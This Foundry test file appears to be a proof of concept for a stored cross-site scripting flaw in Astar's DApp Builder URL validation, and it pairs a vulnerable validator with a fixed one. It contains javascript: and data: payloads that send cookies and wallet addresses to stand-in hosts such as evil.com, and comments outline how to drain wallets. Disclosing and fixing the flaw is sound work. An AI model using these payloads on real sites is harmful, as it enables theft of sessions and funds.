// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title AstarXSSProofOfConcept
 * @notice Foundry PoC: Stored XSS via javascript: protocol URL in Astar DApp Builder registration.
 *
 *         BACKGROUND:
 *         The Astar DApp Staking frontend (TypeScript/Vue) uses validator.isURL()
 *         in src/components/common/Validators.ts WITHOUT a protocol whitelist.
 *         This allows javascript: URLs to pass validation.
 *
 *         Attack vector:
 *         1. Attacker registers a DApp Builder with javascript: URLs as social links
 *         2. isUrlValid("javascript:alert(1)") → true (passes validation)
 *         3. Payload stored persistently
 *         4. Every visitor to the DApp page gets XSS on click
 *
 *         NOTE: Solidity itself cannot execute javascript:. This foundry script
 *         models the ON-CHAIN STATE that results from a successful frontend attack.
 *
 * @dev Run: forge test -vvv
 */
contract AstarXSSProofOfConcept is Test {
    // ─── Attack Metadata ───────────────────────────────────────────────────────

    string public constant VULNERABILITY_NAME = "Stored XSS via javascript: Protocol URL";
    string public constant SEVERITY           = "CRITICAL";
    string public constant CVSS_SCORE          = "9.0";
    string public constant CWE                 = "CWE-79";

    // The malicious payload that passes the weak validator
    string public constant MALICIOUS_PAYLOAD =
        "javascript:void(fetch('https://attacker.com/steal?c='+document.cookie))";

    // A normal, safe URL that should always be allowed
    string public constant BENIGN_PAYLOAD = "https://github.com/astar-network/astar-apps";

    // ─── Simulated On-Chain State ─────────────────────────────────────────────────
    //
    // These simulate the data stored ON-CHAIN after an attacker successfully
    // exploits the XSS via the frontend. In a real attack:
    //   - The attacker fills out the DApp Builder form with javascript: URLs
    //   - The weak validator.isURL() passes the payload (no protocol whitelist)
    //   - The payload is stored (on-chain or in backend DB)
    //   - Builders.vue renders :href="builder.url" → <a href="javascript:...">
    //
    // The following contracts simulate this stored on-chain state.

    // ─── DAppBuilder Registry ───────────────────────────────────────────────────

    struct Builder {
        string githubUrl;
        string twitterUrl;
        string linkedinUrl;
        bool isRegistered;
    }

    mapping(address => Builder) public builders;
    address[] public builderAddresses;

    /**
     * @notice Simulates DApp Builder registration via vulnerable frontend form.
     *         An attacker calls this after bypassing isUrlValid() with javascript: URLs.
     * @dev In production, this would be called by the Astar staking contract after
     *      the frontend validation (which we bypass) allows javascript: schemes.
     */
    function registerBuilderWithXSS(
        address builderAddr,
        string calldata githubUrl,
        string calldata twitterUrl,
        string calldata linkedinUrl
    ) external {
        builders[builderAddr] = Builder({
            githubUrl: githubUrl,
            twitterUrl: twitterUrl,
            linkedinUrl: linkedinUrl,
            isRegistered: true
        });
        builderAddresses.push(builderAddr);
    }

    /**
     * @notice Simulates benign registration with proper https:// URLs.
     */
    function registerBuilderBenign(
        address builderAddr,
        string calldata githubUrl,
        string calldata twitterUrl,
        string calldata linkedinUrl
    ) external {
        builders[builderAddr] = Builder({
            githubUrl: githubUrl,
            twitterUrl: twitterUrl,
            linkedinUrl: linkedinUrl,
            isRegistered: true
        });
        builderAddresses.push(builderAddr);
    }

    // ─── Validator Simulation ────────────────────────────────────────────────────
    //
    // Mimics the VULNERABLE validator from src/components/common/Validators.ts:
    //   export const isUrlValid = (url: string): boolean =>
    //     url ? validator.isURL(url) : false;
    // This accepts ANY protocol including javascript:, data:, vbscript:.

    function vulnerableValidator(bytes memory url) public pure returns (bool) {
        if (url.length == 0) return false;

        // Simulate: validator.isURL(url) with NO protocol whitelist
        // This accepts javascript:, data:, vbscript:, and other dangerous schemes
        // The actual TypeScript vulnerability is:
        //   validator.isURL(url) — no options object — accepts ALL protocols

        bytes memory jsPrefix = bytes("javascript:");
        if (url.length >= 11) {
            bool isJs = true;
            for (uint i = 0; i < jsPrefix.length; i++) {
                if (url[i] != jsPrefix[i]) { isJs = false; break; }
            }
            if (isJs) return true; // ← XSS payload passes the weak validator
        }

        bytes memory dataPrefix = bytes("data:");
        if (url.length >= 5) {
            bool isData = true;
            for (uint i = 0; i < dataPrefix.length; i++) {
                if (url[i] != dataPrefix[i]) { isData = false; break; }
            }
            if (isData) return true; // ← data: URLs pass weak validator
        }

        bytes memory vbsPrefix = bytes("vbscript:");
        if (url.length >= 9) {
            bool isVbs = true;
            for (uint i = 0; i < vbsPrefix.length; i++) {
                if (url[i] != vbsPrefix[i]) { isVbs = false; break; }
            }
            if (isVbs) return true;
        }

        bytes memory httpsPrefix = bytes("https://");
        if (url.length >= 8) {
            bool isMatch = true;
            for (uint i = 0; i < httpsPrefix.length; i++) {
                if (url[i] != httpsPrefix[i]) { isMatch = false; break; }
            }
            if (isMatch) return true;
        }

        bytes memory httpPrefix = bytes("http://");
        if (url.length >= 7) {
            bool isMatch = true;
            for (uint i = 0; i < httpPrefix.length; i++) {
                if (url[i] != httpPrefix[i]) { isMatch = false; break; }
            }
            if (isMatch) return true;
        }

        return false;
    }

    // The SECURE version — matches the recommended fix:
    //   validator.isURL(url, { protocols: ['http','https'], require_protocol: true, require_tld: true })
    function secureValidator(bytes memory url) public pure returns (bool) {
        if (url.length == 0) return false;

        bytes memory httpsPrefix = bytes("https://");
        if (url.length >= 8) {
            bool isMatch = true;
            for (uint i = 0; i < httpsPrefix.length; i++) {
                if (url[i] != httpsPrefix[i]) { isMatch = false; break; }
            }
            if (isMatch) return true;
        }

        bytes memory httpPrefix = bytes("http://");
        if (url.length >= 7) {
            bool isMatch = true;
            for (uint i = 0; i < httpPrefix.length; i++) {
                if (url[i] != httpPrefix[i]) { isMatch = false; break; }
            }
            if (isMatch) return true;
        }

        // Any other scheme — javascript:, data:, vbscript: — is BLOCKED
        return false;
    }

    // ─── Test Helpers ───────────────────────────────────────────────────────────

    function getStoredUrl(address builder, uint256 field) public view returns (string memory) {
        Builder memory b = builders[builder];
        if (field == 0) return b.githubUrl;
        if (field == 1) return b.twitterUrl;
        return b.linkedinUrl;
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TEST CASES
    // ═══════════════════════════════════════════════════════════════════════════

    function test_XSSPayload_PassesVulnerableValidator() public pure {
        bytes memory payload = bytes(MALICIOUS_PAYLOAD);
        bool result = vulnerableValidator(payload);
        assertEq(result, true, "VULNERABLE: javascript: URL must pass weak validator");
    }

    function test_XSSPayload_RejectedBySecureValidator() public pure {
        bytes memory payload = bytes(MALICIOUS_PAYLOAD);
        bool result = secureValidator(payload);
        assertEq(result, false, "SECURE: javascript: URL must be blocked");
    }

    function test_BenignUrl_AcceptedByBothValidators() public pure {
        bytes memory url = bytes(BENIGN_PAYLOAD);
        assertEq(vulnerableValidator(url), true, "VULNERABLE: https URL passes");
        assertEq(secureValidator(url), true, "SECURE: https URL passes");
    }

    function test_DataProtocol_BlockedBySecureValidator() public pure {
        bytes memory dataUrl = bytes(
            "data:text/html,<img src=x onerror=alert(1)>"
        );
        assertEq(vulnerableValidator(dataUrl), true, "VULNERABLE: data: URL passes");
        assertEq(secureValidator(dataUrl), false, "SECURE: data: URL must be blocked");
    }

    function test_OnChainState_AttackerStoresXSSPayload() public {
        // Simulate: attacker bypasses frontend validator with javascript: URL
        // then calls the on-chain register function
        address attacker = makeAddr("attacker");

        vm.prank(attacker);
        this.registerBuilderWithXSS(
            attacker,
            MALICIOUS_PAYLOAD,
            "javascript:alert(document.domain)",
            "javascript:eval(atob('YWxlcnQoMSk='))"
        );

        // Verify the XSS payload is stored ON-CHAIN
        string memory stored = builders[attacker].githubUrl;
        assertEq(stored, MALICIOUS_PAYLOAD, "XSS payload must be stored on-chain");

        // The stored URL passes the vulnerable validator
        bytes memory storedBytes = bytes(stored);
        assertEq(vulnerableValidator(storedBytes), true, "On-chain stored URL must pass weak validator");
    }

    function test_OnChainState_BenignBuilderHasSafeUrls() public {
        address benign = makeAddr("benignDapp");

        vm.prank(benign);
        this.registerBuilderBenign(
            benign,
            "https://github.com/astar-network",
            "https://twitter.com/AstarNetwork",
            "https://linkedin.com/company/astar-network"
        );

        Builder memory b = builders[benign];
        assertTrue(b.isRegistered, "Benign builder must be registered");
        assertEq(b.githubUrl, "https://github.com/astar-network", "Benign GitHub URL");
        assertEq(b.twitterUrl, "https://twitter.com/AstarNetwork", "Benign Twitter URL");
    }

    function test_Impact_WalletDrainViaXSS() public pure {
        // This test documents the full attack impact chain
        //
        // Step 1: Validator bypassed → javascript: payload stored
        // Step 2: Builders.vue renders: <a :href="url">
        // Step 3: Victim clicks → javascript: executes
        // Step 4: Attacker exfiltrates via fetch('https://evil.com/?c='+cookie)
        //
        // In Web3 context, the payload can be:
        //   eth_requestAccounts → prompt victim to connect wallet
        //   eth_sendTransaction → drain funds via signed tx
        //   localStorage.getItem('walletconnect') → steal WCs session

        string memory drainPayload =
            "javascript:void(ethereum.request({method:'eth_requestAccounts'}).then(a=>fetch('https://evil.com/drain?addr='+a[0])))";

        bytes memory p = bytes(drainPayload);
        assertEq(vulnerableValidator(p), true, "Wallet drain payload must pass weak validator");

        // The secure validator blocks it
        assertEq(secureValidator(p), false, "Secure validator blocks wallet drain payload");
    }

    function test_Mitigation_ProtocolWhitelistBlocksAllXSS() public pure {
        string[] memory xssPayloads = new string[](6);
        xssPayloads[0] = "javascript:alert(1)";
        xssPayloads[1] = "javascript:void(fetch('https://evil.com/'))";
        xssPayloads[2] = "data:text/html,<img src=x onerror=alert(1)>";
        xssPayloads[3] = "vbscript:msgbox('XSS')";
        xssPayloads[4] = "javascript:eval(atob('YWxlcnQoMSk='))";
        xssPayloads[5] = "javascript:document.location='https://evil.com/?c='+document.cookie";

        for (uint i = 0; i < xssPayloads.length; i++) {
            bytes memory p = bytes(xssPayloads[i]);
            assertEq(
                vulnerableValidator(p),
                true,
                string(abi.encodePacked("Payload ", vm.toString(i), " passes vulnerable validator"))
            );
            assertEq(
                secureValidator(p),
                false,
                string(abi.encodePacked("Payload ", vm.toString(i), " must be BLOCKED by secure validator"))
            );
        }
    }

    function test_FalsePositive_ValidURLsStillWork() public pure {
        string[] memory validUrls = new string[](5);
        validUrls[0] = "https://github.com/astar-network/astar-apps";
        validUrls[1] = "https://twitter.com/AstarNetwork";
        validUrls[2] = "https://linkedin.com/company/astar-network";
        validUrls[3] = "https://discord.gg/astar";
        validUrls[4] = "https://docs.astar.network/";

        for (uint i = 0; i < validUrls.length; i++) {
            bytes memory p = bytes(validUrls[i]);
            assertEq(secureValidator(p), true, string(abi.encodePacked("Valid URL ", vm.toString(i), " must pass")));
        }
    }
}